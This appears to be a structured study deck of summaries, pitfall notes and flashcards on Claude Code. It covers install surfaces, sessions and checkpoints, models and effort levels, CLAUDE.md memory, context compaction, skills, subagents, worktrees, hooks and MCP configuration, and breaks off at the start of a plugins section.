groups.label: Headless, CI and the Agent SDK

concepts.s: Claude Code is one agent engine reachable from the terminal CLI, IDE extensions, a desktop app, the web and mobile, Slack and CI, and they all share the same CLAUDE.md, settings and MCP configuration.

x.b:
The Claude Code overview page describes it as an agentic coding tool that reads your codebase, edits files, runs commands and integrates with your tools. Each surface connects to the same engine, so your CLAUDE.md files, settings and MCP servers work across all of them.

  • Terminal CLI: the full-featured surface. The docs recommend the native installer (a curl of Anthropic's install.sh piped to bash on macOS, Linux and WSL, or a PowerShell script on Windows). Native installs auto-update in the background.
  • Homebrew: brew install --cask claude-code tracks a stable channel that the docs say is usually about a week behind and skips releases with major regressions; claude-code@latest tracks the newest. Homebrew and WinGet installs do not auto-update.
  • IDE: the VS Code extension (also installs in Cursor) gives inline diffs, @-mentions and plan review. The JetBrains plugin needs the CLI installed separately.
  • Desktop app: macOS and Windows, with Linux in beta. It bundles Claude Code and adds visual diff review, parallel sessions and scheduled tasks. It requires a paid subscription.
  • Web and mobile: claude.ai/code runs sessions in the cloud on a fresh clone, available in desktop browsers and the Claude iOS and Android apps.

The overview and Remote Control pages list these hand-offs:

  • Remote Control (claude remote-control, or /remote-control in Desktop and VS Code) lets a phone or browser drive a session that keeps executing on your machine. It needs a Pro, Max, Team or Enterprise login; API keys are not supported, and on Team and Enterprise an Owner must enable it.
  • Cloud to terminal: start a long task on the web or mobile and pull it local with claude --teleport; push local work up with claude --cloud.
  • Terminal to desktop: /desktop continues the current terminal session in the desktop app for visual diff review.
  • Slack: mention @Claude with a bug report and get a pull request back.

Per the overview, most surfaces need a Claude subscription or a Claude Console account. If ANTHROPIC_API_KEY is set, Claude Code skips the login prompt and asks you to approve the key instead. The terminal CLI, VS Code and JetBrains also run against third-party providers (Amazon Bedrock, Google Cloud's Agent Platform, Microsoft Foundry). On native Windows, the docs recommend Git for Windows so the Bash tool works; without it Claude Code falls back to PowerShell.

For a healthcare org, the HIPAA setup page says the HIPAA configuration applies only to local-mode sessions signed in with a Claude Enterprise account that connect directly to the Claude API. Sessions through Bedrock, Vertex, Foundry or an LLM gateway are not eligible for it.

Trap: Assuming a Homebrew or WinGet install keeps itself current. Only native installs auto-update; package-manager installs need brew upgrade or winget upgrade for features and security fixes.
Trap: Expecting a cloud session to see your local plugins, user settings or settings.local.json. The settings page says cloud sessions read the repo's committed .claude/settings.json and server-managed settings only.
Synthesis: Pick the surface by where the code must execute: local terminal or desktop when Claude needs your files, tools and credentials; cloud when the task is long, parallel or must survive a closed laptop; Remote Control when you want the phone UI but local execution.

cards.q: Which Claude Code install methods auto-update in the background?
cards.a: Native installs. Homebrew and WinGet installs do not, so you upgrade them yourself.

cards.q: What does Remote Control do, and where does the code execute?
cards.a: It lets claude.ai/code or the Claude mobile app drive a Claude Code session, while execution and file access stay on your own machine.

cards.q: Which command pulls a cloud session into your local terminal?
cards.a: claude --teleport. It requires a claude.ai subscription.

cards.q: What is the difference between the claude-code and claude-code@latest Homebrew casks?
cards.a: claude-code tracks the stable channel, usually about a week behind and skipping releases with major regressions; claude-code@latest gets every release immediately.

cards.q: Does the JetBrains plugin include the CLI?
cards.a: No. It requires the Claude Code CLI to be installed separately; the desktop app, by contrast, bundles Claude Code.

concepts.n: The agent loop, tools, sessions and checkpoints
concepts.s: Claude Code is a harness that wraps a Claude model with tools and context management, runs a gather-act-verify loop you can interrupt at any point, and records every session locally so you can resume, fork or rewind it.

x.b:
The How Claude Code works page describes three blended phases: gather context, take action and verify results. Two components power the loop: the model that reasons and the tools that act. The docs call the surrounding layer the agentic harness.

  • Built-in tool categories: file operations, search, execution (shell, tests, git), web (search and fetch) and code intelligence (type errors, go-to-definition; needs a code intelligence plugin). Claude also has tools to spawn subagents and ask you questions.
  • What it can access: your project directory, your terminal, git state, CLAUDE.md, auto memory and any extensions you configure.
  • Steering: press Esc to stop immediately (the running tool call is cancelled). Type a correction and press Enter without stopping to queue it; Claude reads it after the current tool calls finish, within the same turn.

Per the docs, each message, tool use and result is written to a plaintext JSONL file under ~/.claude/projects/. Sessions are independent: a new session starts with a fresh context window.

  • claude --continue or claude --resume reopens a session under the same ID and appends to it.
  • --fork-session or /branch copies the history into a new session ID and leaves the original unchanged.
  • Sessions are tied to a directory; the /resume picker shows the current worktree's sessions by default.
  • Switching git branches changes the files Claude sees but keeps the conversation.

The checkpointing page says every prompt that starts a turn creates a checkpoint of files Claude's edit tools touch. Snapshots are kept for the 100 most recent checkpoints in a session and are deleted by the retention sweep, by default about 30 days after the session last saved one (cleanupPeriodDays).

Open the menu with /rewind or Esc twice on an empty prompt. Options: Restore code and conversation, Restore conversation, Restore code, Summarize from here, Summarize up to here, Never mind.

Trap: Treating checkpoints as a safety net for shell commands. Files changed by Bash (rm, mv, cp), most subagent edits, external edits, and symlinked or hard-linked files are not restored. Remote side effects (databases, APIs, deploys) cannot be checkpointed at all.
Trap: Using checkpoints in place of git. The docs describe them as session-level recovery; commits remain your durable history.
Trap: Pressing Esc twice with text in the prompt. That clears the input instead of opening the rewind menu (the text goes to input history).

• Does this task touch remote systems that rewind cannot undo? If so, gate them with permission rules instead of relying on checkpoints.
  • Do I want to continue this thread (--continue) or explore an alternative without losing it (/branch)?
  • Is the context now polluted enough that a fresh session plus a written handoff beats resuming?

cards.q: What are the three phases of Claude Code's agentic loop?
cards.a: Gather context, take action and verify results. They blend together and repeat until the task is done.

cards.q: How do you redirect Claude mid-task without stopping it?
cards.a: Type the correction and press Enter. It is queued and Claude reads it as soon as the running tool calls finish, within the same turn.

cards.q: What is the difference between --resume and --fork-session?
cards.a: --resume (or --continue) appends to the same session ID; --fork-session (or /branch) copies the history into a new session ID and leaves the original intact.

cards.q: Does /rewind undo a file deleted with rm through the Bash tool?
cards.a: No. Checkpoints track only edits made by Claude's file editing tools, not Bash-driven changes.

cards.q: How many checkpoints keep file snapshots per session?
cards.a: The 100 most recent checkpoints in a session.

concepts.n: Models, effort, thinking and cost visibility
concepts.s: You choose a model with an alias or full ID, tune reasoning depth with effort levels, and watch spend with /usage, the status line and JSON cost fields.

x.b:
The model configuration page lists aliases default, best, fable, sonnet, opus, haiku, sonnet[1m], opus[1m] and opusplan. Aliases resolve to the newest model in the family for your provider; pin a version with a full model name. Precedence, highest first: /model in session, claude --model, ANTHROPIC_MODEL, the model setting, then ANTHROPIC_DEFAULT_MODEL.

  • Fable models (Fable 5.1 and Fable 5) are described as the most capable, for long autonomous tasks, and are never the default; select them with /model fable.
  • opusplan uses Opus in plan mode and Sonnet for execution.
  • Fallback: --fallback-model or a fallbackModel array tries alternates when the primary is overloaded.
  • Each model has its own prompt cache, so the settings page warns that the first request after a switch re-reads the whole conversation uncached.

Effort levels are low, medium, high, xhigh and max, set with /effort, --effort, CLAUDE_CODE_EFFORT_LEVEL or effortLevel. Defaults vary by model. The Week 16 digest called xhigh the recommended setting for most coding work when it shipped with Opus 4.7.

The costs page says extended thinking is on by default, thinking tokens bill as output, and thinking cannot be turned off on Opus 5.5, Sonnet 5.5, Haiku 5.5 or the Fable models. On adaptive-reasoning models use effort instead of MAX_THINKING_TOKENS, which they ignore when nonzero.

/effort ultracode (or claude --effort ultracode) is a separate session toggle that has Claude plan a dynamic workflow for each substantive task; the workflows page warns each request then uses more tokens and time.

• /usage: the Session block shows token counts and a locally computed dollar estimate (meant for API users); subscribers also see plan usage bars and, on paid plans, attribution of usage to skills, subagents, plugins and MCP servers with fix recommendations.
  • /insights writes an HTML report on how you work, from up to 200 recent sessions.
  • claude -p --output-format json returns total_cost_usd with a per-model breakdown; both are client-side estimates.
  • OpenTelemetry export is the only option the docs name for streaming per-user token and cost metrics into your own observability stack on every setup.

The costs page reports enterprise averages of about $13 per developer per active day and $150 to $250 per developer per month, with 90% of users under $30 per active day.

Trap: Leaving Opus as the default for routine work on an API or cloud-provider plan. The costs page names long uncleared sessions and Opus-as-default as the usual causes of unexpected spend.
Trap: Switching models mid-session casually. The next request re-reads the full conversation without cache.
Trap: Trusting the /usage dollar figure as your bill. It is computed at list price unless an admin sets modelPricing in managed settings.
Synthesis: Treat model and effort as two separate dials: the model sets the capability ceiling, effort sets how much of it each turn spends. Raise effort before switching to a bigger model when a task fails for lack of reasoning depth.

cards.q: What does the opusplan alias do?
cards.a: It uses Opus while in plan mode and switches to Sonnet for execution.

cards.q: List the Claude Code effort levels from lowest to highest.
cards.a: low, medium, high, xhigh, max.

cards.q: Which takes precedence: claude --model or the model key in settings.json?
cards.a: claude --model. The order is /model, then --model, then ANTHROPIC_MODEL, then the model setting, then ANTHROPIC_DEFAULT_MODEL.

cards.q: Which JSON field gives the estimated cost of a claude -p run?
cards.a: total_cost_usd, returned with --output-format json alongside a per-model breakdown.

cards.q: Why does switching models mid-session cost more on the next request?
cards.a: Each model has its own prompt cache, so the first request after a switch re-reads the whole conversation uncached.

concepts.s: Plan mode lets Claude read, explore and write a plan without editing your source, and you approve or edit that plan before any change happens.

x.b:
The permission modes page gives three ways in: press Shift+Tab to cycle to it, prefix a single prompt with /plan, or start with claude --permission-mode plan. Press Shift+Tab again to leave without approving.

  • Claude can read files, run shell commands to explore and write a plan. It cannot edit source until you approve.
  • Shell commands while planning: if auto mode is available and useAutoModeDuringPlan is on (the default), the classifier reviews commands; otherwise anything outside the built-in read-only set prompts you.
  • The built-in Plan subagent does read-only research during plan mode.

When the plan is ready, Claude offers Yes, and use auto mode (or Yes, auto-accept edits when auto mode is unavailable), Yes, manually approve edits, or No, keep planning. Press Ctrl+G to open the plan in your text editor and change it first.

Plans are saved to ~/.claude/plans/ by default (change with plansDirectory). The context window page says the plan is re-injected from disk after compaction, so it survives a long session.

• Boris Cherny, who created Claude Code, said in an X thread (January 2, per Thread Reader) that he starts most sessions in plan mode, iterates until the plan is right, then switches to auto-accept edits.
  • The costs page recommends plan mode for complex tasks because a wrong initial direction causes expensive rework.
  • The opusplan alias pairs naturally with plan mode: stronger reasoning for the plan, cheaper execution.

Trap: Assuming plan mode is a hard read-only sandbox in every case. The docs note an exception: in interactive terminal sessions with bypass permissions available, plan-mode blocks are not enforced.
Trap: Approving a plan you skimmed. Once you choose an auto option, edits flow without per-file prompts; Ctrl+G editing is the cheap place to fix scope.

cards.q: Name three ways to enter plan mode.
cards.a: Shift+Tab to cycle to it, prefix a prompt with /plan, or start with claude --permission-mode plan.

cards.q: Which key opens the proposed plan in your editor before approval?
cards.a: Ctrl+G.

cards.q: Where are plan files stored by default?
cards.a: ~/.claude/plans/, configurable with the plansDirectory setting.

cards.q: Does the plan survive auto-compaction?
cards.a: Yes. The plan Claude wrote in plan mode is re-injected from disk after compaction.

concepts.n: CLAUDE.md, rules, AGENTS.md and auto memory
concepts.s: CLAUDE.md files are instructions you write and Claude loads every session, .claude/rules scopes instructions to file paths, and auto memory is a per-repo notebook Claude writes for itself.

x.b:
The memory docs list four CLAUDE.md locations, all concatenated into context (none override each other):

  • Managed policy: /Library/Application Support/ClaudeCode/CLAUDE.md (macOS), /etc/claude-code/CLAUDE.md (Linux, WSL), C:\Program Files\ClaudeCode\CLAUDE.md (Windows).
  • User: ~/.claude/CLAUDE.md.
  • Project: ./CLAUDE.md or ./.claude/CLAUDE.md, committed for the team.
  • Local: ./CLAUDE.local.md, personal and gitignored.

Files in the working directory and every ancestor load at launch, ordered root-down so the closest file is read last; CLAUDE.local.md is appended after CLAUDE.md at each level. Files in subdirectories load on demand when Claude reads or edits a file there. /init generates a starter CLAUDE.md (and suggests improvements if one exists). Run /context to confirm what loaded.

• Imports: @path/to/file expands another file inline. Relative paths resolve from the importing file; maximum depth is four hops. Imports organize content but do not reduce context cost.
  • .claude/rules/: markdown files that load every session, or only when Claude touches matching files if they have paths frontmatter. ~/.claude/rules/ holds personal rules for every project.
  • AGENTS.md: Claude Code reads it as project instructions when no CLAUDE.md, .claude/CLAUDE.md or CLAUDE.local.md exists in the working directory or above (requires v2.1.277 or later). The Project instructions setting claude-md-and-agents-md loads both.
---
paths:
  - "src/api/**/*.ts"
---

# API Development Rules
- All API endpoints must include input validation

The memory page says Claude saves four kinds of notes, tagged with a type field: user, feedback, project and reference. It skips anything derivable from the code or already in CLAUDE.md.

  • Stored at ~/.claude/projects/<project>/memory/; the project is derived from the git repo, so all worktrees share one memory directory.
  • The first 200 lines or 25KB of MEMORY.md, whichever comes first, load at session start.
  • On by default in local sessions. Toggle in /memory (saves autoMemoryEnabled), set autoMemoryEnabled: false per project, or export CLAUDE_CODE_DISABLE_AUTO_MEMORY=1.

Related steering: output styles (/output-style; built-ins Proactive, Concise, Explanatory, Learning) change role, tone and format for a whole session. The output styles page frames the split as CLAUDE.md for what Claude should know and an output style for how it responds.

• Target under 200 lines per CLAUDE.md; the docs say longer files cost context and reduce adherence. Move part-of-the-codebase guidance into path-scoped rules and occasional reference material into skills.
  • The project-root CLAUDE.md and unscoped rules are re-read from disk after /compact; nested CLAUDE.md files and paths: rules reload only when a matching file is read again.
Trap: Writing guardrails as CLAUDE.md prose. The memory page says Claude treats CLAUDE.md as context, not enforced configuration; use a PreToolUse hook or a deny rule for anything that must never happen.
Trap: Adding a CLAUDE.local.md to a repo that relies on AGENTS.md. It counts as a CLAUDE.md file, so Claude stops reading AGENTS.md for you unless you switch Project instructions to claude-md-and-agents-md.
Trap: Expecting a gitignored CLAUDE.local.md to follow you into new worktrees. It exists only where you created it; import a file from your home directory instead.

cards.q: In what order do CLAUDE.md files from parent directories appear in context?
cards.a: From the filesystem root down to the working directory, so the file closest to where you launched is read last; CLAUDE.local.md follows CLAUDE.md at each level.

cards.q: What is the maximum import depth for @path imports in CLAUDE.md?
cards.a: Four hops.

cards.q: How much of MEMORY.md loads at session start?
cards.a: The first 200 lines or 25KB, whichever comes first.

cards.q: When does Claude Code read AGENTS.md by default?
cards.a: Only when there is no CLAUDE.md, .claude/CLAUDE.md or CLAUDE.local.md in the working directory or above it.

cards.q: How do you make a rule load only when Claude works on TypeScript API files?
cards.a: Put it in .claude/rules/ with paths frontmatter, for example paths: ["src/api/**/*.ts"].

concepts.s: Everything Claude Code sends lives in one finite context window, and you manage it with /context to inspect, /compact or /rewind summaries to shrink, /clear to reset, and subagents to keep bulky reads out.

x.b:
The context window page lists what loads at startup: system prompt, auto memory, environment info, MCP tool names (schemas deferred), skill descriptions, CLAUDE.md files, plus a git status snapshot. As you work, file reads, command output and conversation accumulate.

Anthropic's engineering post on context engineering frames context as a finite attention budget with diminishing returns (context rot), and cites Claude Code's compaction as a long-horizon technique that keeps key decisions while discarding redundant tool output.

Several current models (the Fable models, Sonnet 5 and recent Opus models) run with a 1M-token window per the model config page; older 4.6 models need a [1m] suffix. CLAUDE_CODE_DISABLE_1M_CONTEXT=1 keeps a 200K window.

• /context: live breakdown by category with suggestions; /context all shows per-MCP-tool token use.
  • /compact focus on ...: summarize now, keeping what you name. A Compact Instructions section in CLAUDE.md steers every compaction.
  • /autocompact 500k: set how full the window gets before auto-compaction (also autoCompactWindow, CLAUDE_CODE_AUTO_COMPACT_WINDOW; values 100K to 1M).
  • /rewind then Summarize from here or Summarize up to here: compress part of the conversation.
  • /clear: start fresh between unrelated tasks. The costs page notes it costs nothing, while /compact is itself a large request.

Per the context window page:

  • Re-injected from disk: project-root CLAUDE.md and unscoped rules, auto memory, the plan-mode plan.
  • Reloaded only on a matching read: paths: rules and nested CLAUDE.md files.
  • Files read or edited: up to five re-read, most recently modified first; a file over 5,000 tokens comes back as a path reference.
  • Invoked skill bodies: re-injected, capped at 5,000 tokens per skill and 25,000 total, oldest dropped first, truncated from the end.
  • Background commands and subagents keep running.
  • SessionStart hooks matching the compact source run and add their output.

Trap: Giving an important rule only in chat. Early conversation instructions can be lost at compaction; put persistent rules in CLAUDE.md.
Trap: Pasting one giant log or file. If a single output refills the window right after each summary, Claude Code stops auto-compacting after a few attempts with a thrashing error.
Trap: Putting the critical part of a long SKILL.md at the bottom. Re-injection keeps the start of the file, so the end is what gets cut.
Synthesis: Use the cheapest tool that fits: /clear for a new task, a focused /compact for continuity, a subagent before the bulky read happens. Compaction is a recovery move; isolation is a prevention move.

cards.q: Which command shows what is consuming your context window?
cards.a: /context, which gives a live breakdown by category with optimization suggestions.

cards.q: How many recently touched files does Claude Code re-read after compaction?
cards.a: Up to five, most recently modified first; files over 5,000 tokens come back as a path reference only.

cards.q: What caps apply to skill bodies re-injected after compaction?
cards.a: 5,000 tokens per skill and 25,000 tokens total, with the oldest invoked skills dropped first.

cards.q: How do you make Claude preserve specific details whenever it compacts?
cards.a: Add a Compact Instructions section to CLAUDE.md, or pass a focus to /compact, such as /compact focus on the API changes.

cards.q: Why prefer /clear over /compact when switching to unrelated work?
cards.a: /clear costs nothing and removes stale context entirely, while /compact must read the whole conversation to summarize it.

concepts.s: A skill is a folder with a SKILL.md whose name and description sit in context until Claude or you invoke it, at which point the full instructions and any bundled files load on demand.

x.b:
The skills docs say skills follow the Agent Skills open standard, and Claude Code adds invocation control, subagent execution and dynamic context injection. Anthropic's engineering post on Agent Skills describes three levels of progressive disclosure: metadata (name and description) preloaded at startup, the SKILL.md body read when relevant, and linked files opened only when needed.

  • Locations: enterprise (managed), personal ~/.claude/skills/<name>/SKILL.md, project .claude/skills/<name>/SKILL.md, and plugin <plugin>/skills/<name>/SKILL.md (invoked as /plugin-name:skill-name).
  • Invocation: type /skill-name, or Claude loads it when the description matches the task.
  • Edits are picked up live without restarting. Legacy .claude/commands/ files still work as commands.
  • Bundled skills include /code-review, /batch, /debug, /loop, /verify and /doctor.

• description: what it does and when to use it; truncated at 1,536 characters combined with when_to_use.
  • disable-model-invocation: true: only you can invoke it (deploys, commits) and it costs no context until used.
  • user-invocable: false: only Claude can invoke it (background knowledge).
  • allowed-tools: tools pre-approved during the turn that invokes the skill.
  • context: fork plus agent: run the skill in a subagent.
  • paths, model, effort, hooks, argument-hint, arguments.
---
name: fix-issue
description: Fix a GitHub issue
disable-model-invocation: true
---

Fix GitHub issue $ARGUMENTS following our coding standards.
1. Read the issue  2. Implement the fix  3. Write tests  4. Commit

A line such as !`git diff HEAD` in the body is dynamic context injection: Claude Code runs it before Claude sees the skill.

• Keep SKILL.md under 500 lines and push reference docs and scripts into sibling files the body links to.
  • Skill content stays in context across later turns, so the docs advise writing standing instructions, not one-time steps.
  • Govern skills like tools: deny Skill entirely, or write rules like Skill(deploy *); skillOverrides sets a skill you did not write to on, name-only, user-invocable-only or off.
  • /skill-doctor reports each skill's context cost and usage; the skill-creator plugin runs with-and-without baselines.

Trap: Vague or overlapping descriptions. The features overview says Claude matches tasks against descriptions, so a fuzzy one loads the wrong skill or none.
Trap: Leaving side-effecting skills model-invocable. Set disable-model-invocation: true on deploy or release skills so Claude cannot trigger them on its own.
Trap: Installing skills from untrusted sources. Anthropic's Agent Skills post warns they can carry malicious code or instructions and recommends trusted sources only, plus review of bundled scripts.

cards.q: What loads into context for a model-invocable skill at session start?
cards.a: Only its name and description; the full SKILL.md body loads when the skill is invoked.

cards.q: Which frontmatter field stops Claude from invoking a skill on its own?
cards.a: disable-model-invocation: true, which also keeps its description out of context until you invoke it.

cards.q: How do you run a skill inside an isolated subagent?
cards.a: Set context: fork in its frontmatter, optionally with agent: (for example Explore) to pick the subagent type.

cards.q: What is the description length limit for a skill?
cards.a: 1,536 characters, counted together with when_to_use.

cards.q: How is a skill from a plugin invoked?
cards.a: With the namespaced form /plugin-name:skill-name.

concepts.s: A subagent is a separate Claude instance with its own context window, system prompt, tools and permissions that does a delegated task and returns only a summary to the main conversation.

x.b:
The subagents page lists four reasons to use them: preserving context, enforcing tool constraints, reusing configurations, and controlling cost by routing work to smaller models. Claude delegates when a task matches a subagent's description.

  • Built-in: Explore (fast, read-only search; Write and Edit denied), Plan (read-only research in plan mode), General-purpose (full tools).
  • Fork: a subagent that starts with a copy of your conversation. The Week 33 digest says fork mode is on by default in interactive sessions.
  • Background: per the Week 27 digest, subagents run in the background by default so Claude keeps working.
  • Invoke by natural language, by @-mention (@"code-reviewer (agent)"), or run a whole session as one with claude --agent code-reviewer.

Subagents are Markdown files with YAML frontmatter; only name and description are required. Priority when names collide: managed, --agents flag, .claude/agents/, ~/.claude/agents/, plugin agents/.

---
name: code-reviewer
description: Reviews code for quality and best practices. Use after code changes.
tools: Read, Glob, Grep
model: sonnet
---

You are a code reviewer. Analyze the code and give specific,
actionable feedback on quality, security, and best practices.

Other fields: disallowedTools, model (sonnet, opus, haiku, fable, full ID or inherit), permissionMode, maxTurns, skills (preloaded in full), mcpServers, hooks, memory, isolation: worktree, effort.

• A subagent gets its own system prompt, not Claude Code's. CLAUDE.md and git status load, except for Explore and Plan, and except when omitClaudeMd is set.
  • Model resolution: per-invocation model from Claude, then frontmatter model, then CLAUDE_CODE_SUBAGENT_MODEL, then the main conversation's model.
  • Disable specific agents with deny rules such as Agent(Explore).
  • Combined descriptions over 15,000 tokens trigger a startup warning.
  • The Week 24 digest says subagents can spawn their own subagents, with background chains capped at five levels.

Trap: Expecting the subagent to know what you discussed. A non-fork subagent starts fresh, so the delegation prompt must carry the context it needs.
Trap: Assuming subagents are free. Their summaries still land in your context, and their own requests still draw on your usage.
Trap: Relying on /rewind for subagent edits. The checkpointing page says most subagent edits are not restored; use git.
Synthesis: Delegate when the intermediate work is large and disposable (searches, logs, multi-file reads) and only the conclusion matters. Keep work in the main thread when you need to watch and steer each step.

cards.q: Which built-in subagent is read-only and optimized for codebase search?
cards.a: Explore. Write and Edit are denied for it.

cards.q: Which two frontmatter fields are required in a custom subagent file?
cards.a: name and description.

cards.q: Where do project and personal subagent definitions live?
cards.a: .claude/agents/ for the project and ~/.claude/agents/ for all your projects.

cards.q: How do you stop Claude from using a particular subagent?
cards.a: Add a deny rule such as Agent(Explore) or Agent(my-agent) to permissions.deny, or pass it in --disallowedTools.

cards.q: What does isolation: worktree do in a subagent definition?
cards.a: Runs the subagent in its own temporary git worktree so its edits do not collide with yours.

concepts.n: Parallel agents: worktrees, agent view, teams and workflows
concepts.s: Claude Code scales out through git worktrees for file isolation, agent view for managing background sessions, experimental agent teams for peer coordination, and dynamic workflows that run many subagents from a script.

x.b:
The worktrees page: claude --worktree feature-auth (or -w) creates .claude/worktrees/<name>/ on a branch named worktree-<name>. claude --worktree "#1234" branches from a pull request.

  • .worktreeinclude (gitignore syntax) copies gitignored files such as .env into new worktrees.
  • worktree.baseRef: "fresh" (default, remote default branch) or "head" (your local HEAD, carrying unpushed work).
  • On exit, a clean unnamed worktree is removed automatically; one with work prompts you.
  • For non-git VCS, WorktreeCreate and WorktreeRemove hooks replace the git logic.

Agent view is a research preview per its docs page. claude agents lists every local session grouped as Pinned, Ready for review, Needs input, Working and Completed. Start one with claude --bg "prompt" or send the current session away with /bg; /fork copies it into a background session. Shell controls include claude attach, claude logs, claude stop. Background sessions move into their own worktree before editing. Each session draws on your quota independently.

• Agent teams are experimental and off by default; enable with CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1. A lead session spawns teammates that share a task list and message each other directly. The docs suggest starting with 3 to 5 teammates, and the costs page says teams use about 7x the tokens of a standard session when teammates run in plan mode.
  • Dynamic workflows are a JavaScript script Claude writes, run in the background by a runtime. Ask for one in a prompt (or include the keyword ultracode), watch with /workflows, and save a run as a reusable command in .claude/workflows/. Limits: up to 16 concurrent agents by default and 1,000 agents per run. /deep-research is the bundled example.
  • Cross-session messaging lets your own sessions pass findings to each other (macOS and Linux, per the Week 32 digest).

Trap: Two parallel agents editing the same files. Agent teams docs warn this causes overwrites; give each worker its own files or its own worktree.
Trap: Forgetting that a worktree is a fresh checkout. Dependencies, .env files and build artifacts are missing until you install them or list them in .worktreeinclude.
Trap: Launching a large workflow without a pilot. The workflows page recommends a small slice first; a Large workflow warning appears past 25 agents or 1.5 million projected tokens.
Synthesis: Choose by who holds the plan: you (separate worktree sessions), Claude turn by turn (subagents, teams), or a script (workflows). Move the plan into code once the same fan-out pattern repeats.

cards.q: Where does claude --worktree feature-auth create the worktree, and on what branch?
cards.a: Under .claude/worktrees/feature-auth/ at the repo root, on a new branch named worktree-feature-auth.

cards.q: Which file copies gitignored files like .env into new worktrees?
cards.a: .worktreeinclude at the project root, using .gitignore syntax.

cards.q: How do you enable agent teams?
cards.a: Set CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1 in the environment or in the env block of settings.json; they are experimental and off by default.

cards.q: Which command opens the screen that lists all your background Claude Code sessions?
cards.a: claude agents (agent view, a research preview).

cards.q: In a dynamic workflow, who decides what runs next?
cards.a: The script Claude wrote, executed by the workflow runtime; intermediate results live in script variables instead of Claude's context.

concepts.s: Hooks are handlers Claude Code itself runs at lifecycle events, which makes them the deterministic layer for formatting, logging, notifications and policy enforcement.

x.b:
The hooks guide says hooks give deterministic control: certain actions always happen instead of relying on the model to choose them. You add a hooks block to a settings file; all matching hooks for an event run in parallel. Key events include SessionStart, UserPromptSubmit, PreToolUse (can block), PermissionRequest, PostToolUse, Notification, SubagentStop, Stop, PreCompact, PostCompact, InstructionsLoaded, ConfigChange, WorktreeCreate and SessionEnd.

Handler types: command (shell), http (POST the event JSON), mcp_tool, prompt (single-turn model judgment) and agent (multi-turn verifier with tools; experimental).

x.t: Config example: format after every edit
x.b:
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          { "type": "command",
            "command": "jq -r '.tool_input.file_path' | xargs npx prettier --write" }
        ]
      }
    ]
  }
}

Hooks read event JSON on stdin and answer through exit codes and stdout. In the guide's protect-files example, a PreToolUse script exits with code 2 to block an edit and its stderr is fed back to Claude. For PreToolUse decisions the most restrictive answer wins, in the order deny, defer, ask, allow.

• The guide says PreToolUse hooks fire before any permission-mode check, so a hook returning deny blocks the tool even in bypassPermissions. A hook returning allow cannot override deny rules from settings.
  • A Stop hook of type prompt or agent can keep Claude working until a condition holds; /goal is built on a session-scoped prompt Stop hook.
  • A SessionStart hook with the compact matcher re-injects context after compaction.
  • The costs page shows a PreToolUse hook rewriting test commands to emit only failures, cutting context from thousands of tokens to hundreds.
  • Default timeouts: 10 minutes for command, http and mcp_tool hooks (lower for some events), 30 seconds for prompt, 60 seconds for agent. /hooks lists what is configured.

Trap: Expecting PostToolUse to undo something. The tool has already executed; block in PreToolUse instead.
Trap: Relying on one hook's deny to stop a sibling hook's side effect. All matching hooks run to completion before results merge.
Trap: Two hooks rewriting the same tool input with updatedInput. They run in parallel and the last to finish wins, which is non-deterministic.
Trap: Assuming a Stop hook means task complete. It fires whenever Claude finishes responding, not on user interrupts.

cards.q: Which hook event can block a tool call before it runs?
cards.a: PreToolUse.

cards.q: What exit code makes a command hook block the action and feed stderr back to Claude?
cards.a: Exit code 2.

cards.q: Can a PreToolUse hook block a tool in bypassPermissions mode?
cards.a: Yes. PreToolUse hooks run before the permission-mode check, so a deny holds even with --dangerously-skip-permissions.

cards.q: Which hook type asks a model to judge a condition in a single turn?
cards.a: type: "prompt", which returns {"ok": true} or {"ok": false, "reason": ...}.

cards.q: Which command shows the hooks Claude Code has loaded?
cards.a: /hooks.

concepts.s: MCP (Model Context Protocol) servers give Claude tools and data from external systems, configured at local, project or user scope, with tool schemas deferred until Claude needs them.

x.b:
The MCP docs show two main transports:

# remote HTTP server (recommended for remote)
claude mcp add --transport http notion <server-url>

# local stdio server; -- separates Claude's options from the server command
claude mcp add --env AIRTABLE_API_KEY=KEY --transport stdio airtable \
  -- npx -y airtable-mcp-server

SSE is deprecated. /mcp shows server status, handles OAuth sign-in and toggles or reconnects servers; claude mcp login <name> authenticates from the shell.

• Local (default): this project only, stored in ~/.claude.json.
  • Project (--scope project): .mcp.json at the repo root, shareable via git. Interactive sessions ask for approval before using these servers; claude mcp reset-project-choices resets the choices.
  • User: all your projects, stored in ~/.claude.json.

When a server is defined in several places, Claude Code uses the single highest-precedence definition without merging fields: local, then project, then user, then plugin-provided, then claude.ai connectors.

• Tool search is on by default: only tool names and server instructions enter context; full schemas load on demand.
  • Claude Code warns when a tool result exceeds 10,000 tokens; the default cap is 25,000 tokens, adjustable with MAX_MCP_OUTPUT_TOKENS.
  • Permission rules use mcp__<server>__* for every tool on a server or mcp__<server>__<tool> for one.

The features overview frames the split this way: MCP gives Claude purpose-built tools for an external system, and a skill teaches Claude how to use those tools well (for example a schema and query patterns for a database MCP).

Trap: Assuming project servers always ask first. In claude -p, the Agent SDK and cloud sessions no prompt can show, so .mcp.json servers load without asking; exclude them with --strict-mcp-config, disabledMcpjsonServers or setting sources.
Trap: Wrapping a CLI that already exists. The costs page says tools like gh, aws and gcloud are still more context-efficient than MCP servers because they add no per-tool listing.
Trap: Expecting fields to merge across scopes. The highest-precedence definition wins whole.
Synthesis: Reach for MCP when the system has no good CLI, needs OAuth, or you want the same integration on every surface including cloud sessions. Pair each important server with a skill that encodes how your team uses it.

cards.q: Where is a project-scoped MCP server stored?
cards.a: In .mcp.json at the project root, which you can commit to share.

cards.q: What is the default MCP scope for claude mcp add, and where is it stored?
cards.a: Local scope, stored in ~/.claude.json and active only for the current project.

cards.q: What is the default MCP tool output limit and how do you change it?
cards.a: 25,000 tokens; set MAX_MCP_OUTPUT_TOKENS to raise it. A warning appears above 10,000 tokens.

cards.q: What does the -- do in claude mcp add ... -- npx server?
cards.a: It separates Claude Code's own options from the server's command and arguments.

cards.q: Write a permission rule matching every tool on an MCP server named github.
cards.a: mcp__github__* (the bare mcp__github form also matches).

concepts.s: A plugin bundles skills, subagents, hooks and MCP servers into one installable, versioned unit, and a marketplace is a catalog file that lists plugins and where to fetch them.

x.b:
The plugins overview defines a plugin as a directory of components with a manifest at .claude-plugin/plugin.json. Components include skills (skills/<name>/SKILL.md, run as /my-plugin:review), agents (agents/), hooks (hooks/hooks.json), MCP servers (.mcp.json), output styles and a JavaScript hooks module (a plugin with one is called a mod).

